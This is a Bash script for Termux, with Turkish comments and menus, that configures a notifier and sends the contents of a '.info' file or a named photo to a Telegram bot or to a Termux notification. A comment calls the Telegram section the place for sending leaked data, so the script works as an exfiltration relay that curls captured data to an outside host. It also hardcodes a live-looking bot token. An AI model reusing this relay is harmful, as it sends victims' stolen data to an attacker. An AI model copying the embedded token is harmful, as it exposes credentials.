# CONFIG DOSYASI KONTROLÜ
if [[ ! -a $PREFIX/lib/.bot_config ]]; then
    echo
    echo
    echo
    printf "\e[33mBOT CONFIG\e[97m DOSYASI BULUNAMADI \e[31m!!!\e[97m\n"
    echo
    echo
    echo
    exit
fi

# YARDIM MENÜSÜ (-h / --help)
if [[ $1 == -h || $1 == --help ]]; then
    clear
    echo
    echo
    echo
    printf "\e[1;33m\n"
    printf "\t+-+-+-+-+-+-+-+-+-+-\e[97m HELP \e[33m+-+-+-+-+-+-+-+-+-+-+-+-\e[31m\n"
    printf "\t[ \e[97mPARAMETERS \e[31m]\e[33m\n"
    printf "\tbot_emossdevtools                \e[31m| \e[97mSettings\e[31m                     |\e[33m\n"
    printf "\t\n"
    printf "\tbot_emossdevtools --send         \e[31m| \e[97mSend messages & notification \e[31m|\n"
    printf "\t[ \e[97mEXAMPLES SEND OPTIONS \e[31m]\e[32m\n"
    printf "\techo ' Test ' > .info && bot_emossdevtools --send\n"
    printf "\techo 'sendPhoto .jpg' > .info && bot_emossdevtools --send\e[33m\n"
    printf "\t+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-\e[97m\n"
    printf "\e[0m"
    echo
    echo
    echo
    exit
fi

# TELEGRAM BOT BİLGİLERİ VE YAPILANDIRMASI
id=$(cat $PREFIX/lib/.bot_config | sed -n 1p | awk '{print $1}')
token="8866647465:AAF3vy0T-O6FDlU-0OVa4FIBYV54NAgWyio"
url="https://api.telegram.org/bot"
send="/sendMessage"
mode=$(cat $PREFIX/lib/.bot_config | sed -n 2p)

# BİLGİ GÖNDERME FONKSİYONU
_send() {
    mode=$(cat $PREFIX/lib/.bot_config | sed -n 2p)
    file_info="saved_info.txt"
    
    # 1. TERMUX API BİLDİRİM MODU
    if [[ $mode == "termux-api" ]]; then
        if [[ -a .info ]]; then
            termux-notification -t "EMOSS-DEV-TOOLS" -c "$(cat .info)"
            termux-toast -b black -c green "$(cat .info)"
            rm .info
            exit
        fi
    fi
    
    # 2. TELEGRAM BOT BİLDİRİM MODU (Sızdırılan Verileri Gönderme Alanı)
    if [[ $mode == "telegram-bot" ]]; then
        if [[ -a .info ]]; then
            control=$(cat .info | awk '{print $1}')
            # Eğer .info içinde görsel gönderilmesi istenmişse
            if [[ $control == "sendPhoto" ]]; then
                photo_path=$(cat .info | awk '{print $2}')
                curl -s -F chat_id="$id" -F photo=@"$photo_path" "${url}${token}/sendPhoto" > /dev/null
            else
                # Normal metin mesajı ise
                message=$(cat .info)
                curl -s -X POST "${url}${token}${send}" -d chat_id="$id" -d text="$message" > /dev/null
            fi
            rm .info
            exit
        fi
    fi
}

# Eğer tetikleyici parametre geldiyse gönderme fonksiyonunu çalıştır
if [[ $1 == "--send" ]]; then
    _send
    exit
fi

# Eğer hiçbir parametre yoksa Ayarlar/Yapılandırma Menüsünü Başlat
clear
echo
echo
echo
printf "\e[1;32m   [1] \e[97mTERMUX-API BİLDİRİM MODU\n"
printf "\e[1;32m   [2] \e[97mTELEGRAM-BOT BİLDİRİM MODU\n"
echo
read -p "   Seçim yapın (1-2): " secim

if [[ $secim == 1 ]]; then
    echo "none" > $PREFIX/lib/.bot_config
    echo "termux-api" >> $PREFIX/lib/.bot_config
    echo -e "\n\e[1;32m[✓] Termux-API Modu Aktif Edildi!\e[0m"
elif [[ $secim == 2 ]]; then
    read -p "   Telegram Chat ID girin: " chat_id
    echo "$chat_id" > $PREFIX/lib/.bot_config
    echo "telegram-bot" >> $PREFIX/lib/.bot_config
    echo -e "\n\e[1;32m[✓] Telegram-Bot Modu Aktif Edildi!\e[0m"
else
    echo -e "\n\e[1;31m[!] Hatalı Seçim Yapıldı!\e[0m"
fi
